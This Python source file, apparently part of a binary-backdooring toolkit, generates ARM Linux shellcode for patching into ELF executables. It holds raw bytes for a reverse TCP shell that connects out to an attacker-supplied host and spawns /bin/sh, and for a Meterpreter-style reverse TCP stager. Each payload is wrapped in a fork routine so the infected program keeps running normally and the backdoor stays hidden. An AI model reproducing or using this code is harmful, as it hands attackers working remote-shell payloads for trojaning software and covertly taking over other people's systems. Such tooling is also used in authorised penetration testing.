'''

Copyright (c) 2013-2014, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import struct
import sys


class linux_elfarmle32_shellcode():
    """
    Linux ELFIntel xarm shellcode class
    """

    def __init__(self, HOST, PORT, e_entry, SUPPLIED_SHELLCODE=None, shellcode_vaddr=0x0):
        #could take this out HOST/PORT and put into each shellcode function
        self.HOST = HOST
        self.PORT = PORT
        self.e_entry = e_entry
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.shellcode = ""
        self.shellcode_vaddr = shellcode_vaddr

    def pack_ip_addresses(self):
        hostocts = []
        if self.HOST is None:
            print "This shellcode requires a HOST parameter -H"
            sys.exit(1)
        for i, octet in enumerate(self.HOST.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def returnshellcode(self):
        return self.shellcode

    def reverse_shell_tcp(self, CavesPicked={}):
        """
        Modified from metasploit payload/linux/armle/shell_reverse_tcp
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)
        #FORKING
        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
        self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
        self.shellcode1 += "\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode1 += "\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode1 += "\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode1 += "\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode1 += "\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4
        self.shellcode1 += (struct.pack("<I", jmpAddr)).strip("\x00")
        self.shellcode1 += "\xea"   #b entrypoint
        
        #ACTUAL SHELLCODE
        self.shellcode1 += ("\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x05\x20\x81\xe2\x8c\x70\xa0"
                            "\xe3\x8d\x70\x87\xe2\x00\x00\x00\xef\x00\x60\xa0\xe1\x84\x10"
                            "\x8f\xe2\x10\x20\xa0\xe3\x8d\x70\xa0\xe3\x8e\x70\x87\xe2\x00"
                            "\x00\x00\xef\x06\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
                            "\x00\x00\x00\xef\x06\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0"
                            "\xe3\x00\x00\x00\xef\x06\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70"
                            "\xa0\xe3\x00\x00\x00\xef\x48\x00\x8f\xe2\x04\x40\x24\xe0\x10"
                            "\x00\x2d\xe9\x0d\x20\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1"
                            "\x10\x00\x2d\xe9\x48\x10\x9f\xe5\x02\x00\x2d\xe9\x00\x20\x2d"
                            "\xe9\x0d\x10\xa0\xe1\x04\x00\x2d\xe9\x0d\x20\xa0\xe1\x0b\x70"
                            "\xa0\xe3\x00\x00\x00\xef"
                            "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef" #exit
                            "\x02\x00")

        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += ("\x2f\x62\x69\x6e"
                            "\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2d\x43\x00"
                            "\x00")
        #exit test
        #self.shellcode1 += "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def reverse_tcp_stager(self, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified metasploit payload/linux/armle/shell/reverse_tcp
        to correctly fork the shellcode payload and contiue normal execution.
        """
        if self.PORT is None:
            print ("Must provide port")
            sys.exit(1)

        #FORK
        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
        self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
        self.shellcode1 += "\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode1 += "\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode1 += "\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode1 += "\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode1 += "\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4
        self.shellcode1 += (struct.pack("<I", jmpAddr)).strip("\x00")
        self.shellcode1 += "\xea"   #b entrypoint

        #SHELLCODE
        self.shellcode1 += ("\xb4\x70\x9f\xe5\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0"
                            "\xe3\x00\x00\x00\xef\x00\xc0\xa0\xe1\x02\x70\x87\xe2\x90\x10"
                            "\x8f\xe2\x10\x20\xa0\xe3\x00\x00\x00\xef\x0c\x00\xa0\xe1\x04"
                            "\xd0\x4d\xe2\x08\x70\x87\xe2\x0d\x10\xa0\xe1\x04\x20\xa0\xe3"
                            "\x00\x30\xa0\xe3\x00\x00\x00\xef\x00\x10\x9d\xe5\x70\x30\x9f"
                            "\xe5\x03\x10\x01\xe0\x01\x20\xa0\xe3\x02\x26\xa0\xe1\x02\x10"
                            "\x81\xe0\xc0\x70\xa0\xe3\x00\x00\xe0\xe3\x07\x20\xa0\xe3\x54"
                            "\x30\x9f\xe5\x00\x40\xa0\xe1\x00\x50\xa0\xe3\x00\x00\x00\xef"
                            "\x63\x70\x87\xe2\x00\x10\xa0\xe1\x0c\x00\xa0\xe1\x00\x30\xa0"
                            "\xe3\x00\x20\x9d\xe5\xfa\x2f\x42\xe2\x00\x20\x8d\xe5\x00\x00"
                            "\x52\xe3\x02\x00\x00\xda\xfa\x2f\xa0\xe3\x00\x00\x00\xef\xf7"
                            "\xff\xff\xea\xfa\x2f\x82\xe2\x00\x00\x00\xef\x01\xf0\xa0\xe1"
                            "\x02\x00")
        self.shellcode1 += struct.pack('!H', self.PORT)
        self.shellcode1 += self.pack_ip_addresses()
        self.shellcode1 += "\x19\x01\x00\x00\x00\xf0\xff\xff\x22\x10\x00\x00"

        self.shellcode = self.shellcode1
        return (self.shellcode1)

    def user_supplied_shellcode(self, CavesPicked={}):
        """
        For user supplied shellcode
        """
        if self.SUPPLIED_SHELLCODE is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #FORK
        self.shellcode1 = "\x00\x40\xa0\xe1"   # mov r4, r0 
        self.shellcode1 += "\x00\x00\x40\xe0"   # sub r0, r0, r0
        self.shellcode1 += "\x02\x70\xa0\xe3"   # mov r7, #2
        self.shellcode1 += "\x00\x00\x00\xef"   # scv 0
        self.shellcode1 += "\x00\x00\x50\xe3"   # cmp r0, #
        self.shellcode1 += "\x04\x00\xa0\xe1"   # mov r0, r4
        self.shellcode1 += "\x04\x40\x44\xe0"   # sub r4, r4, r4
        self.shellcode1 += "\x00\x70\xa0\xe3"   # mov r7, #0
        self.shellcode1 += "\x00\x00\x00\x0a"   # beq to shellcode
        # JMP Address = (entrypoint - currentaddress -8)/4
        jmpAddr = 0xffffff + (self.e_entry -(self.shellcode_vaddr +len(self.shellcode1)) - 4)/4
        self.shellcode1 += (struct.pack("<I", jmpAddr)).strip("\x00")
        self.shellcode1 += "\xea"   #b entrypoint

        #SHELLCODE
        self.shellcode1 += supplied_shellcode

        self.shellcode = self.shellcode1
        return (self.shellcode1)
